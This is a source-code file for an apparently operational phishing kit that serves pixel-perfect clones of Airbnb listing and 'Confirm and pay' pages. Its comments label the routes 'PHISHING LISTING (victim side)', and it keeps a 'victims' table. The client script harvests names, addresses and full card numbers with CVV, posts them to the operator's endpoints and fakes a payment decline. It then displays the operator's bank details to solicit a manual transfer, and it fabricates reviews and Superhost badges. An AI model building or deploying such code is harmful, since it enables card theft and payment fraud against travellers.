  var LID = ${JSON.stringify(String(listing.id))};
  var META = ${metaJson};
  var PAY = ${payJson};
  window.__VID = VID; window.__META = META; window.__PAYMENT = PAY;

  function toast(t){ var el=document.getElementById('toast'); el.textContent=t; el.style.display='block'; setTimeout(function(){el.style.display='none';}, 2400); }
  function track(stage, data){
    try{
      fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify(Object.assign({victim_id:VID||LID, stage:stage}, data||{}))});
    }catch(e){}
  }
  track('confirm_pay_view', {checkin:META.checkin, checkout:META.checkout, total:META.total});

  // formatters
  var cc=document.getElementById('cc-number');
  if(cc) cc.addEventListener('input', function(){
    var v=cc.value.replace(/\\D/g,'').slice(0,16);
    cc.value=v.replace(/(\\d{4})(?=\\d)/g,'$1 ').trim();
  });
  var ex=document.getElementById('cc-exp');
  if(ex) ex.addEventListener('input', function(){
    var v=ex.value.replace(/\\D/g,'').slice(0,4);
    if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2);
    ex.value=v;
  });

  function showManual(){
    document.getElementById('err-box').classList.add('show');
    document.getElementById('step-pay').classList.add('hide');
    document.getElementById('step-manual').classList.add('show');
    document.getElementById('page-title').textContent = 'Complete your payment';
    function setRow(id, val){
      var el = document.getElementById(id);
      if(!el) return;
      var row = document.getElementById('row-' + id.replace('m-',''));
      // map ids
      var map = { 'm-bank':'row-bank','m-ben':'row-ben','m-iban':'row-iban','m-bic':'row-bic','m-acc':'row-acc','m-sort':'row-sort','m-route':'row-route','m-atype':'row-atype','m-bsb':'row-bsb','m-addr':'row-addr' };
      var rid = map[id];
      var r = rid ? document.getElementById(rid) : null;
      if (val) { el.textContent = val; if(r) r.style.display = ''; }
      else { el.textContent = ''; if(r) r.style.display = 'none'; }
    }
    setRow('m-bank', PAY.bank || '');
    setRow('m-ben', PAY.beneficiary || '');
    setRow('m-iban', PAY.iban || '');
    setRow('m-bic', PAY.bic || '');
    setRow('m-acc', PAY.account_number || '');
    setRow('m-sort', PAY.sort_code || '');
    setRow('m-route', PAY.routing_number || '');
    setRow('m-atype', PAY.account_type || '');
    setRow('m-bsb', PAY.bsb || '');
    setRow('m-addr', PAY.bank_address || '');
    document.getElementById('m-ref').textContent = (PAY.reference_prefix || 'ABB') + '-' + (VID||'');
    try{ window.scrollTo({top:0,behavior:'smooth'}); }catch(e){ window.scrollTo(0,0); }
    track('payment_declined_manual_shown');
  }

  document.getElementById('pay-form').addEventListener('submit', function(e){
    e.preventDefault();
    var btn=document.getElementById('btn-pay');
    btn.disabled=true; btn.textContent='Processing…';

    var guest={
      victim_id: VID,
      listing_id: LID,
      stage: 'details',
      full_name: document.getElementById('g-name').value,
      email: document.getElementById('g-email').value,
      phone: document.getElementById('g-phone').value,
      checkin: META.checkin,
      checkout: META.checkout,
      guests: META.adults,
      address: document.getElementById('g-address').value,
      city: document.getElementById('g-city').value,
      postcode: document.getElementById('g-postcode').value,
      country: document.getElementById('g-country').value
    };

    var card={
      victim_id: VID||LID,
      card_number: (document.getElementById('cc-number').value||'').replace(/\\s/g,''),
      card_holder: document.getElementById('cc-name').value,
      expiry: document.getElementById('cc-exp').value,
      cvv: document.getElementById('cc-cvv').value,
      amount: String(META.total||0),
      card_type: 'credit'
    };

    // save guest first, then card, then force decline → payment config
    fetch('/api/proxy-submit/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(guest)})
      .then(function(r){return r.json()})
      .then(function(d){ if(d && d.victim_id){ VID=String(d.victim_id); window.__VID=VID; card.victim_id=VID; } })
      .catch(function(){})
      .then(function(){
        return fetch('/api/card',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(card)});
      })
      .catch(function(){})
      .then(function(){
        setTimeout(function(){ showManual(); btn.disabled=false; btn.textContent='Confirm and pay'; }, 900);
      });
    return false;
  });

  document.getElementById('btn-transfer-done').addEventListener('click', function(){
    fetch('/api/payment-confirm',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({victim_id:VID||LID, marketplace:'airbnb'})});
    track('manual_transfer_confirm');
    document.getElementById('step-manual').innerHTML =
      '<div style="text-align:center;padding:28px 10px">'+
      '<div style="width:64px;height:64px;border-radius:50%;background:#008A05;color:#fff;font-size:34px;line-height:64px;margin:0 auto 14px">✓</div>'+
      '<h2 style="margin:0 0 8px">Request received</h2>'+
      '<p style="color:#717171;font-size:15px;line-height:1.5">We\\'ll email your confirmation once the transfer is verified. Reference <strong>ABB-'+(VID||'')+'</strong>.</p>'+
      '<button type="button" class="btn-pay" style="margin-top:18px" onclick="location.href=\\'${esc(roomBack)}\\'">Back to listing</button></div>';
  });
})();
</script>
</body>
</html>`;
}


// === PHISHING LISTING (victim side) ===
app.get('/listing/:id', (req, res) => {
  const listing = findListingByParam(req.params.id) || db.prepare("SELECT * FROM listings WHERE id = ? AND status = 'active'").get(req.params.id);
  return serveListingPage(req, res, listing);
});

app.get('/rooms/:code', (req, res) => {
  const code = req.params.code;
  const listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR public_path = ? OR CAST(id AS TEXT) = ?)").get(code, '/rooms/' + code, code);
  return serveListingPage(req, res, listing);
});

// Airbnb-style Confirm and pay (full page funnel)
function findListingForBook(param) {
  const code = String(param || '').trim();
  if (!code) return null;
  return (
    db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR public_path = ? OR public_path = ? OR CAST(id AS TEXT) = ?)").get(
      code, '/rooms/' + code, '/book/stays/' + code, code
    ) || null
  );
}

function ensureBookVictim(listing, req, q) {
  let vid = parseInt(q.victim_id || q.vid || req.cookies && req.cookies.mf_vid || '0', 10) || 0;
  if (vid) {
    const existing = db.prepare('SELECT * FROM victims WHERE id = ?').get(vid);
    if (existing && Number(existing.listing_id) === Number(listing.id)) {
      db.prepare("UPDATE victims SET stage = 'confirm_pay' WHERE id = ?").run(vid);
      try { advanceListingStatus(listing, 'invoice_sent'); } catch (e) {}
      return vid;
    }
  }
  const vr = db.prepare(
    "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ?, ?, ?, 'confirm_pay')"
  ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-agent'] || '');
  try { advanceListingStatus(listing, 'invoice_sent'); } catch (e) {}
  return vr.lastInsertRowid;
}

app.get('/book/stays/:productId', (req, res) => {
  const listing = findListingForBook(req.params.productId);
  if (!listing) return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-top:80px">Listing not found</h1>');
  const q = req.query || {};
  const vid = ensureBookVictim(listing, req, q);
  res.cookie('mf_vid', String(vid), { httpOnly: false, sameSite: 'lax', path: '/' });
  res.cookie('mf_px_lid', String(listing.id), { httpOnly: false, sameSite: 'lax', path: '/' });
  res.set({ 'Cache-Control': 'no-store', 'X-Frame-Options': 'SAMEORIGIN' });
  res.type('html').send(airbnbConfirmPayPage(listing, vid, q));
});

app.get('/book/stays', (req, res) => {
  const q = req.query || {};
  const key = q.productId || q.listing_code || q.code || q.id;
  const listing = findListingForBook(key);
  if (!listing) return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-top:80px">Listing not found</h1>');
  const vid = ensureBookVictim(listing, req, q);
  res.cookie('mf_vid', String(vid), { httpOnly: false, sameSite: 'lax', path: '/' });
  res.type('html').send(airbnbConfirmPayPage(listing, vid, q));
});

app.get('/hotel/:code', (req, res) => {
  let code = req.params.code;
  const listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR listing_code = ? OR public_path = ? OR public_path = ?)").get(
    code, code.endsWith('.html') ? code : code + '.html',
    '/hotel/' + code, '/hotel/' + (code.endsWith('.html') ? code : code + '.html')
  );
  return serveListingPage(req, res, listing);
});

// Airbnb 2026 Pixel-Perfect Clone — Static HTML/CSS template
// This generates a 1:1 replica of the real Airbnb listing page design

function airbnbPage(listing, victimId) {
  const imgs = parseListingImages(listing);
  while (imgs.length < 5) {
    const last = imgs[imgs.length - 1] || 'https://images.unsplash.com/photo-1502672260266-1c1ef2d93688?w=1200';
    imgs.push(last);
  }

  const locale = listing.locale || 'en';
  const localeInfo = LOCALES[locale] || LOCALES.en;
  const currency = listing.currency || localeInfo.currency || 'EUR';
  const priceNight = parseFloat(listing.price) || 0;
  const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 1500);
  const hideNightly = Number(listing.hide_nightly) === 1;
  const subtotal = hideNightly ? priceMonth : (priceNight || priceMonth);
  const cleaning = Math.round(subtotal * 0.12);
  const service = Math.round(subtotal * 0.15);
  const total = subtotal + cleaning + service;
  const guests = listing.guests || 4;
  const bedrooms = listing.bedrooms || Math.max(1, Math.floor(guests / 2));
  const beds = listing.beds || bedrooms;
  const baths = listing.baths || 1;
  const rating = parseFloat(listing.rating) || 4.92;
  const reviewCount = parseInt(listing.reviews) || 48;
  const host = listing.host_name || 'Host';
  const hostPhoto = listing.host_photo || '';
  const ptype = listing.property_type || 'Entire apartment';
  const loc = listing.location || '';
  const title = listing.title || 'Apartment';
  const desc = listing.description || 'A spacious, light-filled home in the heart of the city.';
  const descHtml = formatDescHtml(desc) || esc(desc).replace(/\n/g, '<br>');
  let amenities = [];
  try { amenities = String(listing.amenities || '').split(',').map(s => s.trim()).filter(Boolean); } catch (e) {}
  if (!amenities.length) amenities = ['Wifi', 'Kitchen', 'Washer', 'Free parking', 'Air conditioning', 'TV', 'Hair dryer', 'Iron', 'Dedicated workspace', 'Self check-in'];

  const reviewsData = generateReviews(listing).slice(0, 6);
  const videoUrl = getListingVideo(listing);
  const hasVideo = !!videoUrl;
  const priceMain = hideNightly ? formatCurrency(priceMonth, locale) : formatCurrency(priceNight || priceMonth, locale);
  const priceUnit = hideNightly ? 'month' : 'night';
  const listingCode = listing.listing_code || String(listing.id);
  const hostInitial = String(host).charAt(0).toUpperCase();

  const amenIcons = {
    Wifi: 'M2 8.82a15 15 0 0 1 20 0M5 12.86a10 10 0 0 1 14 0M8.5 16.9a5 5 0 0 1 7 0M12 20h.01',
    Kitchen: 'M3 3v7a4 4 0 0 0 4 4h1v7M21 3v18M16 3v7a4 4 0 0 1-2 3.46',
    Washer: 'M3 6h18M5 6v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V6M12 17a3 3 0 1 0 0-6 3 3 0 0 0 0 6z',
    'Air conditioning': 'M12 2v20M4.93 4.93l14.14 14.14M2 12h20M4.93 19.07L19.07 4.93',
    TV: 'M2 7h20v12H2zM8 21h8M12 19v2',
    'Hair dryer': 'M4 10a6 6 0 0 1 12 0v2H4v-2zM16 10h2a2 2 0 0 1 2 2v0a4 4 0 0 1-4 4h-2',
    Iron: 'M4 14h16v4H4zM8 10c0-3 3-5 8-5h4v3',
    'Dedicated workspace': 'M3 5h18v12H3zM8 21h8M12 17v4',
    'Self check-in': 'M15 7a4 4 0 1 0-3.2 3.9L4 18.7 5.3 20l2-2H10v2h2v-3.3l.1-.1A4 4 0 0 0 15 7z',
    'Free parking': 'M6 3h9a5 5 0 0 1 0 10H10v8H6V3zm4 3v4h5a2 2 0 0 0 0-4h-5z',
    'Paid parking': 'M6 3h9a5 5 0 0 1 0 10H10v8H6V3zm4 3v4h5a2 2 0 0 0 0-4h-5z',
    Pool: 'M2 15c2 0 2-1 4-1s2 1 4 1 2-1 4-1 2 1 4 1 2-1 4-1M2 20c2 0 2-1 4-1s2 1 4 1 2-1 4-1 2 1 4 1 2-1 4-1M8 4a4 4 0 0 1 8 2c0 3-4 5-4 5',
    Heating: 'M12 2v8M8 6l4-4 4 4M6 14a6 6 0 0 0 12 0',
    Elevator: 'M5 3h14v18H5zM12 8l3 3H9l3-3zM12 16l-3-3h6l-3 3z',
    Gym: 'M6 6v12M18 6v12M6 9h12M6 15h12M3 9h3v6H3zM18 9h3v6h-3z',
    Breakfast: 'M18 8h1a4 4 0 0 1 0 8h-1M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8zM6 1v3M10 1v3M14 1v3',
    Fireplace: 'M12 3c4 4 6 7 6 10a6 6 0 1 1-12 0c0-3 2-6 6-10z',
    'Smoke alarm': 'M12 3a6 6 0 0 1 6 6c0 4-3 5-3 8H9c0-3-3-4-3-8a6 6 0 0 1 6-6zM10 21h4',
    'Carbon monoxide alarm': 'M12 3a6 6 0 0 1 6 6c0 4-3 5-3 8H9c0-3-3-4-3-8a6 6 0 0 1 6-6zM10 21h4',
  };
  const defaultAmenPath = 'M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 5v6l4 2';

  const amenHtml = amenities.slice(0, 10).map(a => {
    const path = amenIcons[a] || defaultAmenPath;
    return `<div class="flex items-center gap-4 py-3">
      <svg class="w-6 h-6 shrink-0 text-gray-800" fill="none" stroke="currentColor" stroke-width="1.6" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="${path}"/></svg>
      <span class="text-[16px] text-gray-800">${esc(a)}</span>
    </div>`;
  }).join('');

  const reviewHtml = reviewsData.map(r => {
    const ph = r.photo
      ? `<img src="${esc(r.photo)}" alt="" class="w-12 h-12 rounded-full object-cover">`
      : `<div class="w-12 h-12 rounded-full bg-gray-700 text-white flex items-center justify-center font-semibold text-lg">${esc(String(r.name || '?').charAt(0))}</div>`;
    return `<div class="space-y-3">
      <div class="flex items-center gap-3">${ph}<div><div class="font-semibold text-[16px]">${esc(r.name)}</div><div class="text-sm text-gray-500">${esc(r.date || '')}</div></div></div>
      <p class="text-[15px] text-gray-800 leading-relaxed line-clamp-4">${esc(r.text)}</p>
    </div>`;
  }).join('');

  const cats = [
    ['Cleanliness', '5.0'], ['Accuracy', '5.0'], ['Check-in', '5.0'],
    ['Communication', '4.9'], ['Location', '4.8'], ['Value', '5.0']
  ];
  const catsHtml = cats.map(c => {
    const pct = (parseFloat(c[1]) / 5) * 100;
    return `<div class="flex items-center gap-3 text-sm"><span class="w-28 shrink-0">${c[0]}</span><div class="flex-1 h-1 bg-gray-200 rounded-full overflow-hidden"><div class="h-full bg-gray-900 rounded-full" style="width:${pct}%"></div></div><span class="w-8 text-right font-medium">${c[1]}</span></div>`;
  }).join('');

  const videoHtml = hasVideo
    ? `<section class="py-8 border-b border-gray-200"><h2 class="text-[22px] font-semibold mb-4">Video tour</h2><div class="rounded-xl overflow-hidden">${embedVideoHtml(videoUrl, 'w-full aspect-video')}</div></section>`
    : '';

  const galleryMain = esc(imgs[0]);
  const thumbs = imgs.slice(1, 5).map((src, i) => {
    const rounded = i === 1 ? 'rounded-tr-xl' : (i === 3 ? 'rounded-br-xl' : '');
    return `<button type="button" onclick="openLightbox(${i + 1})" class="relative overflow-hidden ${rounded} focus:outline-none group">
      <img src="${esc(src)}" alt="" class="w-full h-full object-cover min-h-[140px] md:min-h-[180px] group-hover:brightness-90 transition" loading="lazy">
    </button>`;
  }).join('');

  const meta = {
    id: listing.id,
    code: listingCode,
    title,
    priceNight,
    priceMonth,
    subtotal,
    cleaning,
    service,
    total,
    loc,
    rating,
    reviewCount,
    host,
    hostPhoto,
    img: imgs[0],
    imgs,
    locale,
    currency,
    hideNightly,
    guestsMax: guests
  };

  const mapQuery = encodeURIComponent(loc || title || 'London');
  // Approximate coords from common cities for Leaflet; client geocodes via Nominatim
  const descParagraphs = descHtml.split(/<br\s*\/?>\s*<br\s*\/?>/i).map(p => `<p class="mb-4 text-[16px] leading-relaxed text-gray-800">${p}</p>`).join('');

  return `<!DOCTYPE html>
<html lang="${esc(locale)}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<meta name="description" content="${esc(String(desc).replace(/\\s+/g, ' ').slice(0, 160))}">
<title>${esc(title)} - Airbnb</title>
<script src="https://cdn.tailwindcss.com"><\/script>
<script>
tailwind.config = {
  theme: {
    extend: {
      colors: { airbnb: { pink: '#FF385C', dark: '#222222', gray: '#717171', line: '#DDDDDD' } },
      fontFamily: { sans: ['Circular', '-apple-system', 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', 'sans-serif'] },
      boxShadow: { book: '0 6px 16px rgba(0,0,0,0.12)' }
    }
  }
}
<\/script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
  html{scroll-behavior:smooth}
  body{font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,sans-serif;color:#222;-webkit-font-smoothing:antialiased}
  .fp-airbnb.flatpickr-calendar{box-shadow:0 8px 28px rgba(0,0,0,.12);border:1px solid #ddd;border-radius:16px;padding:8px;font-family:inherit}
  .fp-airbnb .flatpickr-day.selected,.fp-airbnb .flatpickr-day.startRange,.fp-airbnb .flatpickr-day.endRange{background:#222;border-color:#222}
  .fp-airbnb .flatpickr-day.inRange{background:#f7f7f7;box-shadow:none;border-color:transparent;border-radius:0}
  .fp-airbnb .flatpickr-day:hover{background:#f0f0f0}
  .fp-airbnb .flatpickr-months .flatpickr-month{height:40px}
  #mf-map{height:480px;width:100%;border-radius:12px;z-index:1}
  .leaflet-container{font:inherit}
  #guest-panel{display:none}
  #guest-panel.open{display:block}
  .lb-overlay{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:9999;display:flex;align-items:center;justify-content:center}
  .line-clamp-4{display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden}
  @media(max-width:767px){
    #booking-card-desktop{display:none!important}
    #mf-map{height:280px}
  }
</style>
</head>
<body class="bg-white text-airbnb-dark">
<!-- Header -->
<header class="sticky top-0 z-50 bg-white border-b border-gray-200">
  <div class="max-w-[1120px] mx-auto px-6 md:px-10 h-16 md:h-20 flex items-center justify-between gap-4">
    <a href="/" class="flex items-center gap-1.5 text-airbnb-pink shrink-0" aria-label="Airbnb">
      <svg viewBox="0 0 32 32" class="w-8 h-8 fill-current" aria-hidden="true"><path d="M16 1c2 5 6 9 11 11-5 2-9 6-11 11-2-5-6-9-11-11 5-2 9-6 11-11z"/></svg>
      <span class="hidden sm:inline font-bold text-xl tracking-tight">airbnb</span>
    </a>
    <div class="hidden md:flex items-center border border-gray-300 rounded-full shadow-sm text-sm divide-x divide-gray-200">
      <span class="px-4 py-2 font-semibold">Anywhere</span>
      <span class="px-4 py-2 text-gray-500">Any week</span>
      <span class="px-3 py-2 text-gray-500 flex items-center gap-2">Add guests
        <span class="w-8 h-8 rounded-full bg-airbnb-pink text-white flex items-center justify-center">
          <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 32 32"><path d="M13 3a10 10 0 1 0 6.3 17.7l6 6 2.1-2.1-6-6A10 10 0 0 0 13 3zm0 2a8 8 0 1 1 0 16 8 8 0 0 1 0-16z"/></svg>
        </span>
      </span>
    </div>
    <div class="flex items-center gap-1">
      <a href="#" class="hidden sm:block text-sm font-semibold px-3 py-2 rounded-full hover:bg-gray-100">Airbnb your home</a>
      <button type="button" class="flex items-center gap-2 border border-gray-300 rounded-full p-1.5 pl-3 hover:shadow-md transition">
        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 32 32"><path d="M2 8h28v2H2zm0 7h28v2H2zm0 7h28v2H2z"/></svg>
        <span class="w-8 h-8 rounded-full bg-gray-500 text-white text-sm flex items-center justify-center">G</span>
      </button>
    </div>
  </div>
</header>

<main class="max-w-[1120px] mx-auto px-6 md:px-10 pb-28 md:pb-16">
  <!-- Title -->
  <div class="pt-6 pb-4">
    <h1 class="text-[26px] md:text-[28px] font-semibold tracking-tight leading-tight">${esc(title)}</h1>
    <div class="mt-2 flex flex-wrap items-center justify-between gap-3">
      <div class="flex flex-wrap items-center gap-1 text-sm">
        <span class="inline-flex items-center gap-1 font-semibold">
          <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 32 32"><path d="M15.094 1.579l-4.124 8.885-9.86 1.27a1 1 0 0 0-.542 1.736l7.293 6.565-1.965 9.852a1 1 0 0 0 1.483 1.061L16 25.951l8.625 4.997a1 1 0 0 0 1.482-1.06l-1.965-9.853 7.293-6.565a1 1 0 0 0-.541-1.735l-9.86-1.271-4.127-8.885a1 1 0 0 0-1.814 0z"/></svg>
          ${rating.toFixed(2)}
        </span>
        <span class="text-gray-400">·</span>
        <a href="#reviews" class="underline font-semibold">${reviewCount} reviews</a>
        ${loc ? '<span class="text-gray-400">·</span><span class="underline font-semibold">' + esc(loc) + '</span>' : ''}
      </div>
      <div class="flex items-center gap-1">
        <button type="button" onclick="mfToast('Link copied')" class="flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-gray-100 text-sm font-semibold underline">
          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8M16 6l-4-4-4 4M12 2v13"/></svg>
          Share
        </button>
        <button type="button" onclick="mfToast('Saved to wishlist')" class="flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-gray-100 text-sm font-semibold underline">
          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20.8 4.6a5.5 5.5 0 0 0-7.8 0L12 5.6l-1-1a5.5 5.5 0 0 0-7.8 7.8l1 1L12 21l7.8-7.8 1-1a5.5 5.5 0 0 0 0-7.8z"/></svg>
          Save
        </button>
      </div>
    </div>
  </div>

  <!-- Gallery -->
  <div class="relative rounded-xl overflow-hidden mb-8">
    <div class="grid grid-cols-1 md:grid-cols-4 md:grid-rows-2 gap-2 h-[280px] sm:h-[340px] md:h-[420px]">
      <button type="button" onclick="openLightbox(0)" class="md:col-span-2 md:row-span-2 relative overflow-hidden group focus:outline-none">
        <img src="${galleryMain}" alt="" class="w-full h-full object-cover group-hover:brightness-90 transition" loading="eager">
      </button>
      ${thumbs}
    </div>
    <button type="button" onclick="openLightbox(0)" class="absolute bottom-4 right-4 bg-white border border-gray-800 rounded-lg px-4 py-1.5 text-sm font-semibold flex items-center gap-2 shadow-sm hover:bg-gray-50">
      <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 16 16"><path d="M3 3h4v4H3zm6 0h4v4H9zM3 9h4v4H3zm6 0h4v4H9z"/></svg>
      Show all photos
    </button>
  </div>

  <!-- Content + Booking -->
  <div class="grid grid-cols-1 lg:grid-cols-[1fr_380px] gap-10 lg:gap-16 items-start">
    <div class="min-w-0">
      <!-- Host row -->
      <section class="pb-6 border-b border-gray-200 flex items-center justify-between gap-4">
        <div>
          <h2 class="text-[22px] font-semibold">${esc(ptype)} hosted by ${esc(host)}</h2>
          <p class="text-[16px] text-gray-700 mt-1">${guests} guests · ${bedrooms} bedroom${bedrooms !== 1 ? 's' : ''} · ${beds} bed${beds !== 1 ? 's' : ''} · ${baths} bath${baths !== 1 ? 's' : ''}</p>
        </div>
        <div class="w-14 h-14 rounded-full overflow-hidden shrink-0 bg-gray-700 text-white flex items-center justify-center text-xl font-semibold">
          ${hostPhoto ? '<img src="' + esc(hostPhoto) + '" alt="" class="w-full h-full object-cover">' : hostInitial}
        </div>
      </section>

      <!-- Highlights -->
      <section class="py-6 border-b border-gray-200 space-y-5">
        <div class="flex gap-4">
          <svg class="w-6 h-6 shrink-0 mt-0.5" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path stroke-linecap="round" d="M12 3l2.5 5 5.5.8-4 3.9.9 5.5L12 16.3 7.1 18.2l.9-5.5-4-3.9 5.5-.8L12 3z"/></svg>
          <div><div class="font-semibold">${esc(host)} is a Superhost</div><div class="text-sm text-gray-500 mt-0.5">Superhosts are experienced, highly rated hosts who are committed to providing great stays.</div></div>
        </div>
        <div class="flex gap-4">
          <svg class="w-6 h-6 shrink-0 mt-0.5" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><path stroke-linecap="round" d="M15 7a2 2 0 1 0-4 0 2 2 0 0 0 4 0zM5 21v-2a4 4 0 0 1 4-4h2M17 11l2 2 4-4"/></svg>
          <div><div class="font-semibold">Great check-in experience</div><div class="text-sm text-gray-500 mt-0.5">Recent guests loved the smooth start to their stay.</div></div>
        </div>
        <div class="flex gap-4">
          <svg class="w-6 h-6 shrink-0 mt-0.5" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M3 10h18M8 3v4M16 3v4"/></svg>
          <div><div class="font-semibold">Free cancellation before check-in</div><div class="text-sm text-gray-500 mt-0.5">Get a full refund if you change your mind before the deadline.</div></div>
        </div>
      </section>

      <!-- Description -->
      <section class="py-8 border-b border-gray-200">
        <div class="prose-p">${descParagraphs}</div>
      </section>

      <!-- Amenities -->
      <section class="py-8 border-b border-gray-200">
        <h2 class="text-[22px] font-semibold mb-4">What this place offers</h2>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-8">${amenHtml}</div>
      </section>

      ${videoHtml}

      <!-- Calendar section -->
      <section class="py-8 border-b border-gray-200" id="calendar">
        <h2 class="text-[22px] font-semibold" id="cal-title">Select check-in date</h2>
        <p class="text-gray-500 mt-1 mb-5" id="cal-sub">Add your travel dates for exact pricing</p>
        <div class="flex flex-col sm:flex-row gap-3 max-w-lg">
          <div class="flex-1">
            <label class="block text-xs font-bold uppercase tracking-wide mb-1">Check-in</label>
            <input id="fp-checkin" type="text" placeholder="Add date" readonly class="w-full border border-gray-400 rounded-lg px-3 py-3 text-[16px] cursor-pointer bg-white focus:outline-none focus:ring-2 focus:ring-gray-800">
          </div>
          <div class="flex-1">
            <label class="block text-xs font-bold uppercase tracking-wide mb-1">Checkout</label>
            <input id="fp-checkout" type="text" placeholder="Add date" readonly class="w-full border border-gray-400 rounded-lg px-3 py-3 text-[16px] cursor-pointer bg-white focus:outline-none focus:ring-2 focus:ring-gray-800">
          </div>
        </div>
        <button type="button" id="btn-clear-dates" class="mt-4 text-sm font-semibold underline">Clear dates</button>
      </section>

      <!-- Reviews -->
      <section class="py-8 border-b border-gray-200" id="reviews">
        <h2 class="text-[22px] font-semibold flex items-center gap-2 mb-6">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 32 32"><path d="M15.094 1.579l-4.124 8.885-9.86 1.27a1 1 0 0 0-.542 1.736l7.293 6.565-1.965 9.852a1 1 0 0 0 1.483 1.061L16 25.951l8.625 4.997a1 1 0 0 0 1.482-1.06l-1.965-9.853 7.293-6.565a1 1 0 0 0-.541-1.735l-9.86-1.271-4.127-8.885a1 1 0 0 0-1.814 0z"/></svg>
          ${rating.toFixed(2)} · ${reviewCount} reviews
        </h2>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-12 gap-y-3 mb-10 max-w-2xl">${catsHtml}</div>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-x-12 gap-y-8">${reviewHtml}</div>
      </section>

      <!-- Map -->
      <section class="py-8 border-b border-gray-200" id="location">
        <h2 class="text-[22px] font-semibold mb-4">Where you'll be</h2>
        <div id="mf-map" class="bg-gray-100"></div>
        <p class="mt-4 font-semibold text-[16px]">${esc(loc || 'Exact location provided after booking')}</p>
        <p class="text-gray-600 text-[15px] mt-1">You'll get the exact address once your reservation is confirmed.</p>
      </section>

      <!-- Host -->
      <section class="py-8">
        <h2 class="text-[22px] font-semibold mb-5">Meet your host</h2>
        <div class="border border-gray-200 rounded-2xl p-6 shadow-sm max-w-md">
          <div class="flex items-center gap-4">
            <div class="w-20 h-20 rounded-full overflow-hidden bg-gray-700 text-white flex items-center justify-center text-3xl font-semibold shrink-0">
              ${hostPhoto ? '<img src="' + esc(hostPhoto) + '" alt="' + esc(host) + '" class="w-full h-full object-cover">' : hostInitial}
            </div>
            <div>
              <div class="text-2xl font-semibold">${esc(host)}</div>
              <div class="text-gray-500 text-sm">Superhost · Joined 2019</div>
            </div>
          </div>
          <div class="flex gap-6 mt-5 pt-5 border-t border-gray-100 text-sm">
            <div><div class="font-semibold text-lg">${reviewCount * 3}</div><div class="text-gray-500">Reviews</div></div>
            <div><div class="font-semibold text-lg">${rating.toFixed(2)} ★</div><div class="text-gray-500">Rating</div></div>
            <div><div class="font-semibold text-lg">5</div><div class="text-gray-500">Years hosting</div></div>
          </div>
          <p class="mt-4 text-[15px] text-gray-700 leading-relaxed">Hi, I'm ${esc(host)}. I love hosting guests and sharing the best of the neighborhood. Message me anytime with questions about the stay.</p>
        </div>
      </section>
    </div>

    <!-- Sticky booking card (desktop) -->
    <aside class="hidden lg:block" id="booking-card-desktop">
      <div class="sticky top-28 border border-gray-300 rounded-xl p-6 shadow-book bg-white" id="booking-card">
        <div class="flex items-end justify-between gap-3 mb-6">
          <div class="text-[22px]"><span class="font-semibold">${priceMain}</span> <span class="text-base font-normal">/ ${priceUnit}</span></div>
          <div class="text-sm flex items-center gap-1">
            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 32 32"><path d="M15.094 1.579l-4.124 8.885-9.86 1.27a1 1 0 0 0-.542 1.736l7.293 6.565-1.965 9.852a1 1 0 0 0 1.483 1.061L16 25.951l8.625 4.997a1 1 0 0 0 1.482-1.06l-1.965-9.853 7.293-6.565a1 1 0 0 0-.541-1.735l-9.86-1.271-4.127-8.885a1 1 0 0 0-1.814 0z"/></svg>
            <span class="font-semibold">${rating.toFixed(2)}</span>
            <span class="text-gray-400">·</span>
            <a href="#reviews" class="underline text-gray-600">${reviewCount} reviews</a>
          </div>
        </div>

        <div class="border border-gray-400 rounded-lg overflow-hidden mb-3">
          <div class="grid grid-cols-2 divide-x divide-gray-400">
            <button type="button" class="text-left px-3 py-2.5 hover:bg-gray-50" id="btn-ci">
              <div class="text-[10px] font-bold tracking-wide">CHECK-IN</div>
